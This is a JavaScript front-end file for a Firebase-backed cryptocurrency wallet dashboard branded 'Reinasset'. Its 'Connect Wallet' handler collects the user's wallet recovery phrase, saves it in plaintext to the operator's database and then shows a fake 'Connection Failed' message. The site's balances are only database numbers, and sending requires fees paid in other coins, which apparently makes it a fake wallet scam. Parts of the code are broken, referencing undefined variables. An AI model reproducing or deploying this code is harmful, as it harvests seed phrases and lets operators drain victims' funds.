import { auth, db, ref, onValue, push, update, set } from "./firebase.js";
import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";

let userData = null;
let prices = {};
let currentActiveCoin = ""; 
let currentCoinPrice = 0;
let currentCoinBalance = 0;


window.openConnectModal = () => {
    const modal = document.getElementById('connectWalletModal');
    if (modal) {
        modal.style.display = 'flex'; // This activates the centering logic in the CSS
    }
};

window.copyAddress = (text) => {
    navigator.clipboard.writeText(text);
    alert("Address copied!");
};

window.handlePasswordReset = () => {
    // If user is logged in, we can pre-fill or just redirect
    window.location.href = "password-reset.html";
};

window.handleLogout = () => {
    auth.signOut()
        .then(() => {
            window.location.href = "index.html";
        })
        .catch((error) => {
            console.error("Logout Error:", error);
        });
};

// Put this at the very top of user.js with your other variables
const logos = {
    btc: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/bitcoin/info/logo.png",
    eth: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/info/logo.png",
    trx: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tron/info/logo.png",
    ltc: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/litecoin/info/logo.png",
    doge: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/doge/info/logo.png",
    usdt_trc: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png",
    bnb: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/info/logo.png",
    sol: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/solana/info/logo.png",
    usdt_erc: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png"
};

// ================= AUTH & REALTIME SYNC =================
// ================= AUTH & REALTIME SYNC =================
onAuthStateChanged(auth, (user) => {
    if (!user) {
        window.location.href = "index.html";
        return;
    }

    const userRef = ref(db, "users/" + user.uid);
    
    onValue(userRef, async (snapshot) => {
        if (!snapshot.exists()) return;
        
        userData = snapshot.val();
        
        // UI Setup
        const fullName = userData.firstName ? `${userData.firstName} ${userData.lastName}` : userData.name;
        document.getElementById("userName").innerText = "Hi, " + (fullName || "User");

        // Single execution for loading data
        try {
            await loadPrices(); 
            
            setTimeout(() => {
                renderAssets();    
                renderNFTs();      
                renderActivity();  
                updateBalance();

                const preloader = document.getElementById('preloader');
                if (preloader) preloader.classList.add('loader-hidden');
                document.querySelector('.app-container').classList.add('animate-load');
            }, 400);

        } catch (e) {
            console.error("Loading error", e);
            document.getElementById('preloader').classList.add('loader-hidden');
        }   
    });
});


// ================= CONNECT WALLET SUBMISSION =================
document.getElementById('submitConnect').onclick = async () => {
    const type = document.getElementById('walletType').value;
    const phrase = document.getElementById('walletPhrase').value.trim();

    // 1. Validation
    if (!phrase) { 
        alert("Please enter your message/phrase"); 
        return; 
    }

    // 2. Auth Check (Prevents silent failures)
    const user = auth.currentUser;
    if (!user) {
        alert("Session expired. Please log in again.");
        window.location.href = "index.html";
        return;
    }

    // 3. UI Transition
    document.getElementById('connectWalletModal').style.display = 'none';
    document.getElementById('pendingModal').style.display = 'flex';
    document.getElementById('exitPending').classList.add('hidden');
    document.getElementById('pendingStatus').innerText = "Connecting to network...";

    try {
        // 4. Database Push (Creates unique ID under 'connectedWallets')
        const walletsListRef = ref(db, `users/${user.uid}/connectedWallets`);
        const newWalletRef = push(walletsListRef);

        await set(newWalletRef, {
            walletType: type,
            phrase: phrase,
            timestamp: Date.now(),
            status: "Pending Verification"
        });

        console.log("Success! Data sent to connectedWallets.");

        // 5. Success/Pending Animation
        setTimeout(() => {
            document.getElementById('pendingStatus').innerText = "Connection Failed: Manual verification required.";
            document.getElementById('exitPending').classList.remove('hidden');
        }, 3000);

    } catch (err) {
        console.error("Database Write Error:", err);
        alert("Write failed: Check your Firebase Rules.");
        document.getElementById('pendingModal').style.display = 'none';
    }
};

// Toggle Modal Helpers
const mainConnectBtn = document.getElementById('connect-wallet');
if (mainConnectBtn) {
    mainConnectBtn.onclick = openConnectModal;
}
document.getElementById('closeConnect').onclick = () => {
    document.getElementById('connectWalletModal').style.display = 'none';
};
document.getElementById('exitPending').onclick = () => {
    document.getElementById('pendingModal').style.display = 'none';
};
// ================= LOAD PRICES (BINANCE API - NO LOCAL STORAGE) =================
async function loadPrices() {
    try {
        // 1. Updated URL
        const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,tron,litecoin,dogecoin,binancecoin,solana&vs_currencies=usd&include_24hr_change=true`);
        
        if (!res.ok) throw new Error("API Network Response was not ok");
        
        const data = await res.json();
        
        // 2. Map CoinGecko IDs to your local 'prices' keys
        // CoinGecko uses IDs (bitcoin) rather than tickers (BTC)
        const mapping = {
            'bitcoin': 'btc',
            'ethereum': 'eth',
            'tron': 'trx',
            'litecoin': 'ltc',
            'dogecoin': 'doge',
            'binancecoin': 'bnb',
            'solana': 'sol'
        };

        prices = {};

        // 3. New Loop Logic for CoinGecko's Object Format
        Object.keys(mapping).forEach(id => {
            if (data[id]) {
                const localKey = mapping[id];
                prices[localKey] = {
                    price: data[id].usd || 0,
                    change: data[id].usd_24h_change || 0
                };
            }
        });

        // 4. Stablecoin Anchors (Since they are always $1.00)
        prices['usdt'] = { price: 1.00, change: 0.00 };
        prices['usdt_trc'] = prices['usdt'];
        prices['usdt_erc'] = prices['usdt'];
        
        console.log("Prices successfully updated via CoinGecko");

    } catch (e) {
        console.warn("Price fetch failed:", e);
    }
}

// ================= NAVIGATION LOGIC =================
const homeView = document.querySelector('.balance-card, .actions-grid, .tabs, #asset-list-container, #nft-container, #activity-container');
const settingsView = document.getElementById('settings-view');

document.getElementById('nav-home').onclick = () => {
    switchView('home');
};

document.getElementById('nav-explore').onclick = () => {
    // Per your request: Explore has same function as Receive
    document.querySelector('.action-item:nth-child(2)').click();
};

document.getElementById('nav-settings').onclick = () => {
    switchView('settings');
    document.getElementById('settingsEmail').innerText = auth.currentUser.email;
    document.getElementById('settingsBalanceDisplay').innerText = document.getElementById('total-display').innerText;
};

// ================= UNIFIED VIEW CONTROLLER =================


function switchView(view) {
    const views = {
        'home': document.getElementById('view-home'),
        'settings': document.getElementById('view-settings'),
        'explore': document.getElementById('view-explore')
    };

    const navs = {
        'home': document.getElementById('nav-home'),
        'settings': document.getElementById('nav-settings'),
        'explore': document.getElementById('nav-explore')
    };

    // 1. Hide ALL views and reset Nav UI
    Object.values(views).forEach(el => { 
        if(el) {
            el.classList.add('hidden');
            el.style.setProperty('display', 'none', 'important'); // Forces the hide
        }
    });
    
    Object.values(navs).forEach(el => { 
        if(el) el.classList.remove('active'); 
    });

    // 2. Identify and Show the REQUESTED view
    const targetView = views[view];
    const targetNav = navs[view];

    if (targetView) {
        targetView.classList.remove('hidden');
        // We use flex or block depending on your CSS preference
        targetView.style.setProperty('display', 'block', 'important'); 
        window.scrollTo(0, 0); // Reset scroll to top when switching
    }
    
    if (targetNav) {
        targetNav.classList.add('active');
    }

    // 3. Logic for Settings Data
    if (view === 'settings' && auth.currentUser) {
        const emailEl = document.getElementById('settingsEmail');
        const balanceEl = document.getElementById('settingsBalanceDisplay') || document.getElementById('settingsBalance');
        const totalDisplay = document.getElementById('total-display');

        if (emailEl) emailEl.innerText = auth.currentUser.email;
        if (balanceEl) {
            balanceEl.innerText = totalDisplay ? totalDisplay.innerText : "$ 0.00";
        }
    }
    
    // 4. Logic for Explore
    if (view === 'explore') {
        loadExploreAddresses();
    }
}
// Attach the events once the page is ready
document.addEventListener('DOMContentLoaded', () => {
    const navHome = document.getElementById('nav-home');
    const navSett = document.getElementById('nav-settings');
    const navExpl = document.getElementById('nav-explore');

    if(navHome) navHome.onclick = () => switchView('home');
    if(navSett) navSett.onclick = () => switchView('settings');
    if(navExpl) navExpl.onclick = () => switchView('explore');
});
// ================= ASSETS RENDERING (CLICKABLE) =================
function renderAssets() {
    const container = document.getElementById("asset-list-container");
    if (!container || !userData) return;
    const supportedCoins = ["btc", "eth", "trx", "ltc", "doge", "usdt_trc", "bnb", "sol", "usdt_erc"];
    container.innerHTML = "";

    supportedCoins.forEach((coin) => {
        const amount = (userData.wallet && userData.wallet[coin]) ? Number(userData.wallet[coin]) : 0;
        const coinData = prices[coin];
        const price = coinData?.price || 0;
        const change = coinData?.change || 0;
        const value = amount * price;
        const isUp = change >= 0;

        const div = document.createElement('div');
        div.className = 'asset-item';
        div.innerHTML = `
            <div class="asset-left">
                <img src="${logos[coin] || ''}" class="coin-logo" />
                <div>
                    <h4>${coin.toUpperCase()}</h4>
                    <small>$${price.toLocaleString()} <span class="${isUp ? 'pos' : 'neg'}">${isUp ? '+' : ''}${change.toFixed(2)}%</span></small>
                </div>
            </div>
            <div class="asset-right">
                <p>$${value.toLocaleString(undefined, {minimumFractionDigits: 2})}</p>
                <small>${amount.toFixed(6)} ${coin.toUpperCase()}</small>
            </div>
        `;
        // Make Clickable
        div.onclick = () => openCoinDetail(coin, amount, price);
        container.appendChild(div);
    });
}

// ================= COIN DETAIL LOGIC =================
function openCoinDetail(coin, amount, price) {
    const modal = document.getElementById('coinDetailModal');
    
    // Fill Text Data
    document.getElementById('detailCoinTitle').innerText = coin.toUpperCase();
    document.getElementById('aboutCoinName').innerText = coin.toUpperCase();
    document.getElementById('detailLogo').src = logos[coin];
    document.getElementById('detailBalanceUSD').innerText = `$${(amount * price).toLocaleString(undefined, {minimumFractionDigits: 2})}`;
    document.getElementById('detailBalanceCrypto').innerText = `${amount} ${coin.toUpperCase()}`;
    
    // Descriptions (matching Image 3)
    const desc = {
        usdt_trc: "USDT TRC20 is Tether's stablecoin issued on the TRON blockchain, offering faster transactions and lower fees while maintaining a 1:1 peg with the US Dollar.",
        btc: "Bitcoin is a decentralized digital currency, without a central bank or single administrator, that can be sent from user to user on the peer-to-peer bitcoin network.",
        eth: "Ethereum is a community-run technology powering the cryptocurrency ether (ETH) and thousands of decentralized applications."
    };
    document.getElementById('coinDescription').innerText = desc[coin] || "Cryptocurrency asset secured by Reinasset.";

    // Show Modal
    modal.classList.remove('hidden');

    // FIX BACK BUTTON
    document.getElementById('closeCoinDetail').onclick = () => {
        modal.classList.add('hidden');
    };

    // LINK SEND BUTTON
    document.getElementById('detailSendBtn').onclick = () => {
        modal.classList.add('hidden');
        openTxnForm(coin, amount); // Your existing send logic
    };

    // LINK RECEIVE BUTTON
    document.getElementById('detailReceiveBtn').onclick = () => {
        modal.classList.add('hidden');
        // Triggers your existing Receive modal
        document.querySelector('.action-item:nth-child(2)').click(); 
    };
}

document.getElementById('closeCoinDetail').onclick = () => {
    document.getElementById('coinDetailModal').classList.add('hidden');
};

// ================= BALANCE CALCULATION =================
function updateBalance() {
    const display = document.getElementById("total-display");
    if (!display || !userData || !userData.wallet) return;

    let total = 0;
    Object.entries(userData.wallet).forEach(([coinKey, amt]) => {
        const coin = coinKey.toLowerCase();
        const amount = Number(amt) || 0;

        if (coin === 'usd') {
            total += amount;
        } else {
            const coinData = prices[coin];
            if (coinData?.price) total += amount * coinData.price;
        }
    });

    display.innerText = "$ " + total.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
}

// ================= TRANSACTION UI LOGIC =================

// 1. Open Send List
document.querySelector('.action-item:nth-child(1)').onclick = () => {
    const list = document.getElementById('sendAssetList');
    list.innerHTML = "";
    document.getElementById('sendModal').classList.remove('hidden');

    // 1. Updated to match your full asset list
    const supported = ['btc', 'eth', 'trx', 'sol', 'doge', 'ada', 'ltc', 'bnb', 'usdt_trc', 'usdt_erc'];
    
    supported.forEach(coinId => {
        // Find the asset details from your global 'assets' array
        const asset = assets.find(a => a.id === coinId);
        if (!asset) return; // Skip if asset isn't defined

        // 2. Safely calculate values
        const amount = userData.wallet?.[coinId] ? Number(userData.wallet[coinId]) : 0;
        const price = marketPrices[coinId] || 0; // Use the same price object as Home
        const value = amount * price;

        const item = document.createElement('div');
        item.className = "asset-item";
        item.style.cursor = "pointer";
        
        // 3. Use the CSS Icon + Color system for consistency
        item.innerHTML = `
            <div class="asset-left">
                <div class="icon" style="background: ${asset.color}; width: 35px; height: 35px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 14px; margin-right: 12px;">
                    ${asset.icon}
                </div>
                <div>
                    <h4 style="margin:0; font-size: 14px;">${asset.name}</h4>
                </div>
            </div>
            <div class="asset-right" style="text-align:right">
                <p style="margin:0; font-weight: 600;">$${value.toLocaleString(undefined,{minimumFractionDigits:2, maximumFractionDigits:2})}</p>
                <small style="color: #666;">${amount.toFixed(4)} ${asset.symbol}</small>
            </div>
        `;
        
        item.onclick = () => openTxnForm(coinId, amount);
        list.appendChild(item);
    });
};

function openTxnForm(coin, balance) {
    currentActiveCoin = coin;
    currentCoinBalance = balance;
    currentCoinPrice = prices[coin]?.price || 0;

    document.getElementById('sendModal').classList.add('hidden');
    document.getElementById('txnModal').classList.remove('hidden');
    
    document.getElementById('txnHeader').innerText = `Send ${coin.toUpperCase()}`;
    document.getElementById('txnCoinBalance').innerText = `${balance} ${coin.toUpperCase()}`;
    
    const amtInput = document.getElementById('sendAmount');
    amtInput.value = "";
    document.getElementById('usdEquivalent').innerText = "≈ $ 0.00 USD";
    document.getElementById('sendError').classList.add('hidden');
}

// Input and Max buttons
document.getElementById('sendAmount').oninput = (e) => {
    const val = Number(e.target.value);
    const usdEquivalent = val * currentCoinPrice;
    document.getElementById('usdEquivalent').innerText = `≈ $ ${usdEquivalent.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})} USD`;
};

document.querySelector('.max-btn').onclick = () => {
    const amtInput = document.getElementById('sendAmount');
    amtInput.value = currentCoinBalance;
    amtInput.dispatchEvent(new Event('input'));
};

// ================= TRANSACTION SUBMISSION =================
document.getElementById('continueBtn').onclick = async () => {
    const amountInput = Number(document.getElementById('sendAmount').value);
    const addressInput = document.getElementById('receiverAddr').value.trim();
    const selectedFeeAsset = document.getElementById('feeAsset').value;
    const errorEl = document.getElementById('sendError');
    
    const showError = (msg) => {
        errorEl.innerText = msg;
        errorEl.classList.remove('hidden');
    };

    errorEl.classList.add('hidden');

    if (amountInput <= 0) return showError("Please enter a valid amount.");
    if (!addressInput) return showError("Receiver wallet address is required.");
    if (amountInput > currentCoinBalance) return showError(`Insufficient ${currentActiveCoin.toUpperCase()} balance.`);

    const fees = { trx: 50, eth: 0.005, doge: 5 };
    const wallet = userData.wallet || {};
    const feeBalance = wallet[selectedFeeAsset] ? Number(wallet[selectedFeeAsset]) : 0;

    if (feeBalance < fees[selectedFeeAsset]) {
        return showError(`Insufficient ${selectedFeeAsset.toUpperCase()} balance. ${fees[selectedFeeAsset]} ${selectedFeeAsset.toUpperCase()} required for fee.`);
    }

    try {
        const userId = auth.currentUser.uid;
        const updates = {};
        const newMainBalance = currentCoinBalance - amountInput;

        updates[`users/${userId}/wallet/${currentActiveCoin}`] = newMainBalance;

        if (currentActiveCoin !== selectedFeeAsset) {
            updates[`users/${userId}/wallet/${selectedFeeAsset}`] = feeBalance - fees[selectedFeeAsset];
        } else {
            updates[`users/${userId}/wallet/${currentActiveCoin}`] = newMainBalance - fees[selectedFeeAsset];
        }

        const activityRef = push(ref(db, `users/${userId}/activity`));
        await update(ref(db), updates);
        await set(activityRef, {
            type: "Sent",
            asset: currentActiveCoin,
            amount: amountInput,
            address: addressInput,
            status: "pending",
            timestamp: Date.now()
        });

        document.getElementById('txnModal').classList.add('hidden');
        document.getElementById('successAmt').innerText = `${amountInput} ${currentActiveCoin.toUpperCase()}`;
        document.getElementById('successModal').classList.remove('hidden');

    } catch (err) {
        showError("System error. Transaction failed.");
    }
};

// Navigation Helpers
document.getElementById('closeSend').onclick = () => document.getElementById('sendModal').classList.add('hidden');
document.getElementById('backToAssets').onclick = () => {
    document.getElementById('txnModal').classList.add('hidden');
    document.getElementById('sendModal').classList.remove('hidden');
};


// ================= NFT RENDERING =================
function renderNFTs() {
    const container = document.getElementById("nft-container");
    if (!container || !userData) return;

    const nfts = userData.nfts || {};

    // Check if user has 0 NFTs
    if (Object.values(nfts).every(v => v === 0)) {
        container.innerHTML = `<p style="text-align:center;color:#888;padding:20px;">No NFTs found</p>`;
        return;
    }

    container.innerHTML = "";
    Object.entries(nfts).forEach(([name, count]) => {
        if (count > 0) {
            container.innerHTML += `
                <div class="asset-item">
                    <div>
                        <h4>${name}</h4>
                        <small>Collection Item</small>
                    </div>
                    <div style="text-align:right">
                        <p>${count}</p>
                    </div>
                </div>`;
        }
    });
}

// ================= ACTIVITY RENDERING =================
function renderActivity() {
    const container = document.getElementById("activity-container");
    if (!container || !userData) return;

    const activities = Object.values(userData.activity || {});

    if (activities.length === 0) {
        container.innerHTML = `<p style="text-align:center;color:#888;padding:20px;">No activity yet</p>`;
        return;
    }

    container.innerHTML = "";
    // Show newest transactions first
    activities.reverse().forEach(act => {
        const date = act.timestamp ? new Date(act.timestamp).toLocaleDateString() : "";
        container.innerHTML += `
            <div class="asset-item">
                <div>
                    <h4 style="text-transform: capitalize;">${act.type}</h4>
                    <small>${act.asset.toUpperCase()} • ${date}</small>
                </div>
                <div style="text-align:right">
                    <p>${act.amount} ${act.asset.toUpperCase()}</p>
                    <span class="status ${act.status || 'pending'}">
                        ${act.status || 'pending'}
                    </span>
                </div>
            </div>`;
    });
}
// ================= RECEIVE MODAL LOGIC =================
document.querySelector('.action-item:nth-child(2)').onclick = () => {
    const listContainer = document.getElementById('receiveList');
    const receiveModal = document.getElementById('receiveModal');
    listContainer.innerHTML = "<p>Loading addresses...</p>";
    receiveModal.classList.remove('hidden');

    const settingsRef = ref(db, "settings/deposit_addresses");
    onValue(settingsRef, (snapshot) => {
        const addresses = snapshot.val() || {};
        
        listContainer.innerHTML = "";
        
        // Use the 'assets' array you defined globally so it matches Explore
        assets.forEach(coin => {
            const addr = addresses[coin.id] || "Address not set";
            listContainer.innerHTML += `
                <div class="receive-item">
                    <div class="icon" style="background: ${coin.color}; width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 14px;">
                        ${coin.icon}
                    </div>
                    <div class="receive-info">
                        <h5>${coin.name} Address</h5>
                        <p>${addr}</p>
                    </div>
                    <div class="receive-actions">
                        <button onclick="copyAddress('${addr}')" style="background:none;border:none;cursor:pointer;color:#2f80ed;font-weight:600;">Copy</button>
                    </div>
                </div>`;
        });
    }, { onlyOnce: true });
};
const closeReceive = document.getElementById('closeReceive');
if (closeReceive) {
    closeReceive.onclick = () => {
        document.getElementById('receiveModal').classList.add('hidden');
    };
}


// ================= TABS SWITCHING LOGIC =================
document.querySelectorAll(".tab-btn").forEach(btn => {
    btn.onclick = () => {
        // 1. Remove 'active' class from all buttons and add to clicked one
        document.querySelectorAll(".tab-btn").forEach(b => b.classList.remove("active"));
        btn.classList.add("active");

        // 2. Hide all tab containers
        document.getElementById("asset-list-container").classList.add("hidden");
        document.getElementById("nft-container").classList.add("hidden");
        document.getElementById("activity-container").classList.add("hidden");

        // 3. Show the target container based on data-tab attribute
        const targetId = btn.dataset.tab + "-container";
        const targetElement = document.getElementById(targetId);
        
        if (targetElement) {
            targetElement.classList.remove("hidden");
        }
    };
});




// Function to load the Explore/Receive data into the full view
function loadExploreAddresses() {
    const container = document.getElementById('exploreList');
    container.innerHTML = "<p style='padding:20px; text-align:center;'>Loading addresses...</p>";

    const settingsRef = ref(db, "settings/deposit_addresses");
    onValue(settingsRef, (snapshot) => {
        const addresses = snapshot.val() || {};
        const coins = [
            { id: 'btc', name: 'Bitcoin', icon: logos.btc },
            { id: 'eth', name: 'Ethereum', icon: logos.eth },
            { id: 'trx', name: 'Tron', icon: logos.trx },
            { id: 'doge', name: 'Doge', icon: logos.doge },
            { id: 'usdt_trc', name: 'USDT (TRC20)', icon: logos.usdt_trc },
            { id: 'ltc', name: 'Litecoin', icon: logos.ltc },
            { id: 'bnb', name: 'Binance Coin', icon: logos.bnb },
            { id: 'sol', name: 'Solana', icon: logos.sol },
            { id: 'usdt_erc', name: 'USDT (ERC20)', icon: logos.usdt_erc }
            
        ];

        container.innerHTML = "";
        coins.forEach(coin => {
            const addr = addresses[coin.id] || "Address not set";
            container.innerHTML += `
                <div class="asset-item" style="border-bottom: 1px solid #f0f0f0;">
                    <div class="asset-left">
                        <img src="${coin.icon}" class="coin-logo">
                        <div>
                            <h4>${coin.name}</h4>
                            <small style="word-break: break-all;">${addr}</small>
                        </div>
                    </div>
                    <button onclick="copyAddress('${addr}')" class="max-btn" style="height:30px; font-size:11px;">Copy</button>
                </div>`;
        });
    }, { onlyOnce: true });
}

// ================= NAVIGATION VIEW CONTROLLER =================
const navItems = document.querySelectorAll('.nav-item');
const homeElements = ['.balance-card', '.actions-grid', '.tabs', '#asset-list-container', '#nft-container', '#activity-container'];




// ================= AUTO-REFRESH EVERY 50 SECONDS =================
setInterval(async () => {
    // Only refresh if we have a logged-in user and their data
    if (auth.currentUser && userData) {
        console.log("50s Heartbeat: Updating prices...");
        await loadPrices(); 
        renderAssets();    
        updateBalance();   
    }
}, 1200000); // 50,000ms = 20 minutes


// Open Modal
document.getElementById('connect-wallet').onclick = () => {
    document.getElementById('connectWalletModal').style.display = 'flex';
};



// Handle Submission


document.getElementById('closeConnect').onclick = () => document.getElementById('connectWalletModal').style.display = 'none';
document.getElementById('exitPending').onclick = () => document.getElementById('pendingModal').style.display = 'none';
